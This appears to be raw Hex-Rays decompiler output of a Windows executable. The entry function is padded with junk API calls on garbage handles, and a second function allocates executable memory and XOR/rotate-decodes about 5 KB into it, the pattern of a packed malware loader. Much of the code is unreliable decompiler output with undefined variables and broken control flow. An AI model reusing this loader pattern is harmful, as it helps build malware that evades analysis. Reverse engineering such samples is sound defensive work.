/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// BOOL __usercall start@<eax>(COLORREF a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<edi>, COLORREF a6@<esi>, double a7@<st3>, double _ST5@<st2>, double _ST6@<st1>);
int sub_402EE2();
// int __stdcall GetSystemMetrics(int nIndex);
// BOOL __stdcall GetMessageW(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
// HWND __stdcall GetDlgItem(HWND hDlg, int nIDDlgItem);
// int __stdcall ReleaseDC(HWND hWnd, HDC hDC);
// BOOL __stdcall DestroyWindow(HWND hWnd);
// BOOL __stdcall PostMessageW(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// BOOL __stdcall UpdateLayeredWindow(HWND hWnd, HDC hdcDst, POINT *pptDst, SIZE *psize, HDC hdcSrc, POINT *pptSrc, COLORREF crKey, BLENDFUNCTION *pblend, DWORD dwFlags);
// HWND __stdcall CreateWindowExW(DWORD dwExStyle, LPCWSTR lpClassName, LPCWSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);
// UINT_PTR __stdcall SetTimer(HWND hWnd, UINT_PTR nIDEvent, UINT uElapse, TIMERPROC lpTimerFunc);
// DWORD __stdcall GetCurrentProcessId();
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// HANDLE __stdcall GetCurrentProcess();
// HMODULE __stdcall GetModuleHandleW(LPCWSTR lpModuleName);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// DWORD __stdcall GetLastError();
// int __stdcall lstrlenW(LPCWSTR lpString);
// DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// BOOL __stdcall QueryPerformanceCounter(LARGE_INTEGER *lpPerformanceCount);
// DWORD __stdcall GetCurrentThreadId();
// BOOL __stdcall FreeLibrary(HMODULE hLibModule);
// LPSTR __stdcall GetCommandLineA();
// int __stdcall lstrcmpiW(LPCWSTR lpString1, LPCWSTR lpString2);
// HLOCAL __stdcall LocalAlloc(UINT uFlags, SIZE_T uBytes);
// LPWSTR __stdcall GetCommandLineW();


//----- (004016CC) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
BOOL __usercall start@<eax>(COLORREF a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<edi>, COLORREF a6@<esi>, double a7@<st3>, double _ST5@<st2>, double _ST6@<st1>)
{
  int v9; // ecx
  int v10; // esi
  WPARAM v11; // esi
  int v12; // ecx
  int v13; // ebx
  __int16 *v14; // esi
  int v15; // ebx
  UINT_PTR v16; // eax
  int v17; // ecx
  int v18; // ebx
  int v19; // esi
  UINT v20; // edx
  int v21; // edx
  int v22; // esi
  int v23; // esi
  DWORD v24; // eax
  LPARAM v25; // edx
  unsigned int v26; // edx
  HWND v27; // eax
  int v28; // ecx
  int v29; // ebx
  int v30; // edx
  COLORREF v31; // ecx
  int v32; // edx
  UINT v33; // edx
  DWORD v34; // edi
  int v35; // eax
  int v36; // ecx
  LPARAM v37; // edx
  int v38; // esi
  BOOL result; // eax
  int v40; // ecx
  int v41; // esi
  unsigned int v42; // ebx
  int v43; // edi
  int v44; // esi
  int v45; // edx
  int v46; // eax
  int v47; // ecx
  _DWORD v50[5]; // [esp-4Ch] [ebp-4Ch] BYREF
  int v51; // [esp-38h] [ebp-38h]
  COLORREF v52[5]; // [esp-30h] [ebp-30h] BYREF
  _BYTE *v53; // [esp-1Ch] [ebp-1Ch]
  int v54; // [esp-Ch] [ebp-Ch]

  v52[1] = a6;
  v52[0] = a1;
  v51 = a4 | 0xD3D7;
  v27 = GetDlgItem((HWND)0xC402FE84, -((~((a4 | a5) + a2 - a3) | a1) ^ ~((a4 | a5) + a2 - a3)));
  v29 = ~(v28 | (unsigned int)v27) + ((v28 - 206) & (v28 + (a4 | 0xD3D7)));
  strcpy((char *)v50, "ÚØÕÙÑÖ");
  GetMessageW(0, (HWND)0xC5DCC2C3, v30 ^ 0xD8DA, 0xFAEFF5AC);
  v10 = v9 + (v50[2] ^ v29);
  lstrcmpiW(0, 0);
  GetCurrentProcess();
  v11 = v10 - v29;
  VirtualAlloc((LPVOID)0xD5D1, 0xB9728D5A, 0xD7u, 0xD7D5D4u);
  GetDlgItem((HWND)0xE054D962, v36);
  PostMessageW((HWND)0x8D0E7667, 0xD5u, v11, v37);
  ReleaseDC((HWND)0x89162BF5, (HDC)0xF0856C61);
  lstrlenW(0);
  GetLastError();
  lstrlenW(0);
  GetCommandLineA();
  GetModuleHandleW(0);
  LocalAlloc(v20, 0xE6B1BC76);
  v22 = v21 ^ ~v11;
  GetModuleHandleA(0);
  v23 = ~v22;
  FreeLibrary((HMODULE)0x88E93C41);
  v34 = v50[1] + 55517 - v23;
  GetSystemMetrics(v34 + 53714);
  v35 = -QueryPerformanceCounter((LARGE_INTEGER *)0xC8B9D4AE);
  CreateWindowExW(
    v34,
    0,
    0,
    ~v23,
    52432,
    -825635889,
    v35,
    -740372526,
    (HWND)0xDECD,
    (HMENU)0xD0D7DCCD,
    (HINSTANCE)0xBBC45ED9,
    (LPVOID)0xD6);
  SetTimer((HWND)0xD7CA0395, 0xFBCF5F07, v33, (TIMERPROC)0x8AD11386);
  v31 = v52[0] - v52[1];
  LOBYTE(v32) = v32 + 1 - ((v32 != -1) + LOBYTE(v52[1]));
  strcpy((char *)v52, "ÞÕËÛÁÈÏ");
  v46 = -v31 - 206;
  v15 = (223 - v46) | 0xDBD2;
  v38 = -((v51 + 1 - (~v51 | v32 & 0xC6)) & v46) - 2;
  result = UpdateLayeredWindow(
             (HWND)0xF0D42A3B,
             (HDC)0xC0C7D9DB,
             (POINT *)0xD5C6D1D8,
             (SIZE *)0xD6,
             (HDC)0xCB,
             (POINT *)0xD7D3C4,
             v52[0],
             (BLENDFUNCTION *)v52[1],
             v52[2]);
  if ( !result )
  {
    v41 = v38 + 1;
    v42 = v40 + v15;
    v43 = 55290;
    GetCurrentThreadId();
    v52[2] = 0;
    do
    {
      v42 = -((__PAIR64__(v42, v26) - 0xCEDB0000D3C7i64) >> 32);
      v43 ^= 0xC7u;
    }
    while ( LoadLibraryA((LPCSTR)v52[2]) );
    v24 = GetCurrentProcessId();
    v44 = -(v41 + 207) - (__CFADD__(PostMessageW((HWND)0x8B728952, v24 + 192, 0xCAD5D4u, v25), 57035) + 205);
    GetCurrentProcessId();
    GetModuleFileNameA((HMODULE)0xB3CA054F, (LPSTR)(v45 | 0xC9), -((v45 | 0xC9) ^ v44));
    ReleaseDC((HWND)0x8578F818, (HDC)0x8E0209BD);
    v16 = SetTimer((HWND)0x99554C52, 0xA5DA8EAC, 0xCED4C9D7, (TIMERPROC)0xF9121FFE);
    v18 = (v17 | 0xD9D3D6) + 213;
    v19 = -v16 ^ 0xCBC5 | 0xC01E;
    DestroyWindow((HWND)0xFF4FF41E);
    v13 = v12 | v18;
    v14 = (__int16 *)(v19 & 0xD3);
    sub_402EE2();
    _ST4 = ((double)*v14
          - ((double)*v14
           - ((double)*v14
            - ((double)*v14
             - ((double)*v14
              - ((double)*v14
               - ((double)*v14
                - a7)
               - (double)*v14)))
            - (double)*v14)))
         * (double)*(__int16 *)(v47 + 1702961334);
    __asm { fstp    st(5) }
    *(_WORD *)(v13 + 4) = __FS__;
    MEMORY[0xF941F92A] &= (unsigned int)&v52[3];
    _EDI = v54;
    *v53 &= BYTE1(v52[3]);
    __asm
    {
      fstp    st(5)
      fstp    st(5)
      rep or edi, 2EDDDD1Eh
    }
    JUMPOUT(0x401AA7);
  }
  return result;
}
// 40189E: positive sp value 24 has been found
// 401AA3: control flows out of bounds to 401AA7
// 401551: variable 'v28' is possibly undefined
// 40157F: variable 'v30' is possibly undefined
// 40104E: variable 'v9' is possibly undefined
// 401801: variable 'v36' is possibly undefined
// 40181B: variable 'v37' is possibly undefined
// 4012A8: variable 'v20' is possibly undefined
// 4012B0: variable 'v21' is possibly undefined
// 40168A: variable 'v33' is possibly undefined
// 4015F8: variable 'v32' is possibly undefined
// 401344: variable 'v25' is possibly undefined
// 401937: variable 'v45' is possibly undefined
// 401240: variable 'v17' is possibly undefined
// 4010F4: variable 'v12' is possibly undefined
// 401A66: variable 'v47' is possibly undefined
// 4018A4: variable 'v40' is possibly undefined
// 4018BC: variable 'v26' is possibly undefined

//----- (00402EE2) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int sub_402EE2()
{
  int v0; // edx
  int v1; // ebx
  _BYTE *v3; // esi
  _BYTE *v4; // ecx
  _BYTE *v5; // [esp+4h] [ebp-4h]

  GetCommandLineW();
  GetCurrentProcess();
  LocalAlloc(0xC2C1u, 0xA12F1DAC);
  v3 = v5;
  v4 = VirtualAlloc(0, 0x6A6Fu, 0x3000u, 0x40u);
  v0 = 5216;
  do
  {
    v1 = 218;
    BYTE1(v1) = -(__ROL1__(*v3, 22) ^ 0x77);
    *v4 = BYTE1(v1);
    ++v3;
    ++v4;
    --v0;
  }
  while ( v0 );
  return ((v1 != 0) - v1 - 1859072666 - (-v1 ^ 0xDE)) ^ 0xDC;
}
// 4032E2: positive sp value 4 has been found
// 403513: variable 'v5' is possibly undefined

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
